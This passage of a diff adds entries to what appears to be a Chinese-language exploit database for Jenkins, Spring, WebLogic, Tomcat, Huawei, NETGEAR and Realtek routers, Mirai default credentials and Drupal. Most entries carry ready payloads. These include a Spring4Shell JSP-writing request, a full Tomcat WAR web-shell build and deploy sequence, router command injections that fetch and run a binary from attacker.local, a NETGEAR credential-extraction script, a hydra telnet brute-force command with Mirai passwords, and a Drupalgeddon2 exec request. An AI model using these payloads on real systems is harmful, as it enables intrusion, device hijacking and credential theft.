+        "title": "CLI 端口序列化载荷发送",
+        "language": "python",
+        "code": "# Jenkins CLI 有两种形态：JNLP TCP 端口（默认 50000 随机）与 HTTP /cli\n# HTTP 形态：\nimport urllib.request\n\npayload = open('payload.bin', 'rb').read()  # ysoserial CommonsCollections1\n# CLI 协议头：0x00000000 + 长度前缀的分帧，向 /cli POST 分片上传\n# 简化判定：GET /cli 存在且返回 CLI 协议错误即暴露\n\n# TCP 形态（JNLP）：直接 socket 序列化帧（同 T3 手法），公开利用脚本可查\n# 命中后命令以 Jenkins 服务账户执行。",
+        "description": "CLI 双通道形态与载荷发送面。"
+      }
+    ],
+    "prerequisites": "CLI 可达（HTTP /cli 或 JNLP 端口）；Jenkins 版本在受影响范围；classpath Gadget 可用（旧版 Jenkins 自带依赖满足）。",
+    "references": [
+      "https://www.jenkins.io/security/advisory/2016-02-24/",
+      "https://nvd.nist.gov/vuln/detail/CVE-2015-8103"
+    ],
+    "tags": [
+      "jenkins",
+      "deserialization",
+      "cli",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Jenkins 官方安全通告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Spring Framework 数据绑定 ClassLoader 操纵远程代码执行（Spring4Shell）",
+    "description": "Spring MVC 数据绑定允许写入 class.module.classLoader 相关属性（Tomcat 部署下修改 AccessLogValve 的目录/前缀/后缀/模式），把日志写为根目录下可执行 JSP。配合 WAR 可访问即 RCE。JDK9+ 反射过滤变化是其暴露前提。",
+    "vulnType": "rce",
+    "affected": "Spring Framework < 5.2.20 / < 5.3.18（JDK 9+ + Tomcat WAR 部署 + 数据绑定表单）",
+    "severity": "critical",
+    "publishedAt": "2022-03-31",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2022-22965"
+      }
+    ],
+    "treePath": "middleware/rce/middleware-rce-spring4shell",
+    "exploitCode": [
+      {
+        "title": "AccessLogValve 日志写 JSP",
+        "language": "http",
+        "code": "POST /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20out.println(%25%7Bc1%7Di%20%25%7Bc2%7Di%20...)&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1\nHost: target.local\nContent-Type: application/x-www-form-urlencoded\n\nc1=Runtime.getRuntime().exec(\"whoami\")&c2=%40page%20import%3D%22java.io.*%22%20%25>\n\n# 随后 GET /shell.jsp 触发；pattern 用头变量注入绕过日志转义。\n# 利用前需先发一个使 valve 初始化的请求。",
+        "description": "以参数写入改日志管道为 JSP 的完整利用形态。"
+      }
+    ],
+    "prerequisites": "Spring MVC 表单绑定接口；JDK 9+；外置 Tomcat WAR 部署（嵌入式/Boot 3 不受此形态影响）；应用目录可写。",
+    "references": [
+      "https://spring.io/security/cve-2022-22965",
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
+    ],
+    "tags": [
+      "spring",
+      "spring4shell",
+      "rce",
+      "data-binding"
+    ],
+    "attribution": {
+      "source": "Spring 官方安全公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "WebLogic IIOP 协议反序列化远程代码执行",
+    "description": "WebLogic IIOP 端口同样承载序列化数据，weblogic.corba.cos 的接口被反序列化策略遗漏。构造 GIOP 头 + 序列化对象发送至 7001/iiop 即触发，常作为 T3 被封禁后的备选通道。",
+    "vulnType": "deserialization",
+    "affected": "Oracle WebLogic Server 10.3.6.0 / 12.1.3.0 / 12.2.1.3.0 / 12.2.1.4.0 / 14.1.1.0.0（2020 年 1 月 CPU 修复）",
+    "severity": "critical",
+    "publishedAt": "2020-01-14",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2020-2551"
+      }
+    ],
+    "treePath": "middleware/rce/middleware-rce-weblogic-iiop",
+    "exploitCode": [
+      {
+        "title": "IIOP 协议反序列化探测",
+        "language": "python",
+        "code": "# 利用结构：GIOP Request 头 + Java 序列化对象体\n# 公开实现：github.com/Y4er/CVE-2020-2551（构造 GIOP + weblogic.corba.cos.naming.NamingContextAnyImpl）\nimport socket\n\nsock = socket.create_connection(('target.local', 7001), timeout=8)\ngiop = bytes.fromhex('47494f500100')  # 'GIOP' 魔数 + 版本\n# 序列化部分用 ysoserial Jython/CC 链构造后按 GIOP 帧拼接\n# 需要按 iiop 协议包装 locate/request；参考公开实现拼帧\nsock.sendall(b'')  # 拼接后发送\nprint(sock.recv(1024))\n\n# 判定：IIOP 端口 7001 上发送 GIOP 握手有响应即面暴露。",
+        "description": "GIOP 帧结构要点与公开实现定位。"
+      }
+    ],
+    "prerequisites": "IIOP 协议启用（默认 7001 同端口）；未打 2020-01 CPU；Gadget 与目标依赖匹配。",
+    "references": [
+      "https://www.oracle.com/security-alerts/cpujan2020.html",
+      "https://nvd.nist.gov/vuln/detail/CVE-2020-2551"
+    ],
+    "tags": [
+      "weblogic",
+      "iiop",
+      "deserialization",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Oracle CPU 公告与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Tomcat Manager WAR 一键部署（凭据获取后）",
+    "description": "与 web-app 域的 PUT 写文件不同，此条覆盖中间件运维面：持有 Manager 凭据（弱口令/配置泄露/内网跳板）后经 manager/text/deploy 一键部署 WAR 获得代码执行，是 Windows/Linux 通用的高价值收尾手段。",
+    "vulnType": "file-upload",
+    "affected": "Apache Tomcat 全版本（Manager 暴露且具备部署角色）",
+    "severity": "high",
+    "publishedAt": "2019",
+    "vulnerabilityIds": [],
+    "treePath": "middleware/file-upload/middleware-file-upload-tomcat-war",
+    "exploitCode": [
+      {
+        "title": "text 接口部署与验证",
+        "language": "bash",
+        "code": "# 生成含 JSP 的 WAR（jsp 内容为命令回显）\nmkdir -p app/WEB-INF && cat > app/cmd.jsp <<'EOF'\n<%@ page import=\"java.util.*,java.io.*\" %>\n<%= new Scanner(Runtime.getRuntime().exec(request.getParameter(\"c\")).getInputStream()).useDelimiter(\"\\\\A\").next() %>\nEOF\ncd app && jar cf ../cmd.war . && cd ..\n\n# 部署（Basic 凭据）\ncurl -sk -u manager:password \\\n  \"http://target.local:8080/manager/text/deploy?path=/cmd&update=true\" \\\n  --upload-file cmd.war\n\n# 验证\ncurl -sk \"http://target.local:8080/cmd/cmd.jsp?c=whoami\"",
+        "description": "从 WAR 构造到部署验证的完整命令序列。"
+      }
+    ],
+    "prerequisites": "manager-text 角色凭据可用；8080 可达；应用允许自动部署（deployXML/deploy 配置未关）。",
+    "references": [
+      "https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html",
+      "https://cwe.mitre.org/data/definitions/434.html"
+    ],
+    "tags": [
+      "tomcat",
+      "war-deploy",
+      "manager",
+      "file-upload"
+    ],
+    "attribution": {
+      "source": "Apache Tomcat 官方文档与 CWE-434",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "华为 HG532 系列路由器 UPnP 远程代码执行",
+    "description": "华为 HG532 系列家用路由器的 UPnP SOAP 接口在 DeviceUpgrade_ 控件处理上拼接 /bin/atr 打点命令未过滤，攻击者经 37215 端口发送构造的 SetUpgradeDevice POST 即可执行任意命令。Mirai 变体（Satori）借此大规模传播。",
+    "vulnType": "rce",
+    "affected": "Huawei HG532e / HG532s / HG532d 等系列固件",
+    "severity": "high",
+    "publishedAt": "2017-12-13",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2017-17215"
+      }
+    ],
+    "treePath": "iot/rce/iot-rce-huawei-router",
+    "exploitCode": [
+      {
+        "title": "UPnP SOAP 命令注入",
+        "language": "http",
+        "code": "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\nHost: target.local:37215\nContent-Length: 96\nContent-Type: text/xml\nSOAPAction: \\\"urn:schemas-upnp-org:service:WANPPPConnection:1#UpgradeFirmware\\\"\n\n<?xml version=\"1.0\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>;wget http://attacker.local/b -O /tmp/b && chmod +x /tmp/b && /tmp/b;</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\n\n# NewStatusURL 直接拼入 system() 调用，分号注入任意命令。",
+        "description": "SOAP 字段命令拼接注入，公开 payload 广为流传。"
+      }
+    ],
+    "prerequisites": "37215 端口可达（公网暴露为常见态势）；目标为 HG532 系列受影响固件。",
+    "references": [
+      "https://www.huawei.com/en/psirt/security-advisories/huawei-sa-20171129-01-hg532-en",
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-17215"
+    ],
+    "tags": [
+      "iot",
+      "router",
+      "huawei",
+      "upnp",
+      "command-injection"
+    ],
+    "attribution": {
+      "source": "华为官方 PSIRT 公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "NETGEAR 路由器认证绕过（恢复口令信息泄露）",
+    "description": "NETGEAR 多款路由器的 web 接口 /setup.cgi?todo=restore 信息泄露缺陷允许未认证读取恢复后的管理凭据，或直接以特殊参数绕过登录。配合管理接口的固件更新功能可进一步实现 RCE，Mirai 系恶意软件长期利用此入口。",
+    "vulnType": "rce",
+    "affected": "NETGEAR R6400/R7000/R7100LG/D7000 等多型号固件 < 1.0.1.36 系列",
+    "severity": "high",
+    "publishedAt": "2017-01-28",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2017-5521"
+      }
+    ],
+    "treePath": "iot/rce/iot-rce-netgear",
+    "exploitCode": [
+      {
+        "title": "认证绕过读取凭据",
+        "language": "python",
+        "code": "import requests\n\n# 1) 触发恢复流程获得 ns_efc_filter cookie\ns = requests.Session()\ns.get('http://target.local/setup.cgi?todo=restore', timeout=5)\n# 2) 带 cookie 请求基本配置页，返回内容中提取管理密码\nr = s.get('http://target.local/password.cgi', timeout=5)\nprint(r.text)  # 页面含 admin_password 字段（明文/弱编码）\n\n# 拿到凭据后登录管理界面即可操作固件升级等高权功能。",
+        "description": "两步请求完成认证绕过与凭据提取。"
+      }
+    ],
+    "prerequisites": "80 端口可达；目标型号/固件在受影响列表；管理界面未被运营商网络隔离。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2017-5521",
+      "https://kb.netgear.com/30632/Web-GUI-Password-Recovery-and-Exposure-Security-Vulnerability"
+    ],
+    "tags": [
+      "iot",
+      "router",
+      "netgear",
+      "auth-bypass"
+    ],
+    "attribution": {
+      "source": "NETGEAR 官方 KB 安全公告",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Realtek 路由 SDK Web 服务器远程代码执行",
+    "description": "Realtek RTL81xx 系列 SoC 的迷你 Web 服务器（boa/goahead 定制版）存在表单解析缓冲区溢出与命令注入缺陷，被大量贴牌路由器/交换机继承。攻击者未认证发送构造表单即可在设备上执行命令，Mirai 变体（Yakuza）借其传播。",
+    "vulnType": "rce",
+    "affected": "Realtek RTL8197x/819x SDK 驱动的路由器（多品牌贴牌）固件 < 2021-05 修复",
+    "severity": "critical",
+    "publishedAt": "2021-05-11",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2021-35394"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2021-35395"
+      }
+    ],
+    "treePath": "iot/rce/iot-rce-realtek-sdk",
+    "exploitCode": [
+      {
+        "title": "表单处理命令注入判定",
+        "language": "http",
+        "code": "POST /goform/formWsc / HTTP/1.1\nHost: target.local\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\n\npingAddr=127.0.0.1;wget http://attacker.local/confirm&...\n\n# 判定面：Realtek SDK 常见 goform 表单点（formWsc/formRebootCheck 等）\n# 命令注入判定可先用延时（;sleep 8;）观察响应时间差。\n# CVE-2021-35395 为配套的诊断/管理页面越权（未认证访问 admin 功能）。",
+        "description": "SDK 表单点的注入判定与配套越权说明。"
+      }
+    ],
+    "prerequisites": "设备 Web 管理口可达；固件基于受影响 Realtek SDK；品牌贴牌型号需按固件特征判定（README 端口指纹）。",
+    "references": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-35394",
+      "https://www.realtek.com/en/certification-list/category/category-security-advisory"
+    ],
+    "tags": [
+      "iot",
+      "router",
+      "realtek",
+      "command-injection",
+      "rce"
+    ],
+    "attribution": {
+      "source": "Realtek 官方安全公告与 NVD",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "id": "",
+    "name": "Mirai 僵尸网络传播目标默认凭据表",
+    "description": "Mirai 及其变体通过内置的 60+ 组 telnet/SSH 默认凭据表（admin:admin、root:xc3511、root:vizxv 等）批量感染弱口令设备。该凭据表本身是 IoT 攻防的基础知识：既用于资产自查也用于红队评估设备弱面。",
+    "vulnType": "default-credentials",
+    "affected": "使用默认凭据的摄像机/DVR/路由器（BusyBox 系嵌入式设备为主）",
+    "severity": "high",
+    "publishedAt": "2016",
+    "vulnerabilityIds": [],
+    "treePath": "iot/default-credentials/iot-default-credentials-mirai-targets",
+    "exploitCode": [
+      {
+        "title": "高频默认凭据自查清单与批量验证",
+        "language": "bash",
+        "code": "# Mirai 凭据表高频前 12 组（完整表见源码泄露）\n#   root:xc3511  root:vizxv  root:admin  admin:admin\n#   root:888888  root:xmhdipc root:default root:juantech\n#   admin:1234   admin:12345  admin:123456 root:54321\n\n# 对自有资产批量验证（hydra 单设备示例）\nhydra -l root -P mirai_passwords.txt -s 23 -f target.local telnet -t 4\n\n# 判定成功标准：登录出现 BusyBox shell 提示符。整改：改密 + 关闭 WAN 侧 telnet。",
+        "description": "凭据表清单与资产自查的批量验证命令。"
+      }
+    ],
+    "prerequisites": "目标设备 23/22 端口可达；凭据未修改；验证行为对授权资产进行。",
+    "references": [
+      "https://github.com/jgamblin/Mirai-Source-Code",
+      "https://www.cloudflare.com/learning/ddos/glossary/mirai-botnet/"
+    ],
+    "tags": [
+      "iot",
+      "mirai",
+      "default-credentials",
+      "telnet"
+    ],
+    "attribution": {
+      "source": "Mirai 源码公开仓库与 Cloudflare 科普页面",
+      "author": "",
+      "license": ""
+    }
+  },
+  {
+    "name": "Drupal 核心 REST/Ajax 请求伪造远程代码执行（Drupalgeddon2）",
+    "description": "Drupal 7 的 #ajax/#pre_render 等渲染数组属性经 Form API 注入后可被 render 引擎执行。无需认证发送构造的 drupal_ajax 请求，将渲染回调替换为系统函数即可 RCE，是 Render API 注入的代表案例。",
+    "vulnType": "rce",
+    "affected": "Drupal 7.x < 7.58（含 8.x 部分版本受相关变体影响）",
+    "severity": "critical",
+    "publishedAt": "2018-03-28",
+    "vulnerabilityIds": [
+      {
+        "type": "CVE",
+        "value": "CVE-2018-7600"
+      },
+      {
+        "type": "EDB-ID",
+        "value": "44448"
+      }
+    ],
+    "exploitCode": [
+      {
+        "title": "drupal_ajax 渲染回调注入",
+        "language": "http",
+        "code": "POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost: target.local\nContent-Type: application/x-www-form-urlencoded\n\nmail[id]=#lazy_builder&mail[0]=exec&mail[1][]=whoami\n\n# #lazy_builder 回调改为 exec，参数数组即命令，响应 JSON 中回显命令输出。",
+        "description": "利用渲染数组 lazy_builder 回调替换实现命令执行并回显。"
+      }
+    ],
+    "prerequisites": "目标 Drupal 版本在受影响范围；/user/register 等表单入口可达；无需任何账户。",
+    "references": [
+      "https://www.drupal.org/sa-core-2018-002",
+      "https://nvd.nist.gov/vuln/detail/CVE-2018-7600"
+    ],
+    "tags": [
+      "drupal",
+      "php",
+      "render-api",
+      "rce"
+    ],
+    "products": [
+      "Drupal"
+    ],
+    "attribution": {
+      "source": "Drupal 官方安全公告 SA-CORE-2018-002"
+    },
+    "treePath": "web-app/rce/web-app-rce-drupalgeddon2"
+  }
+]
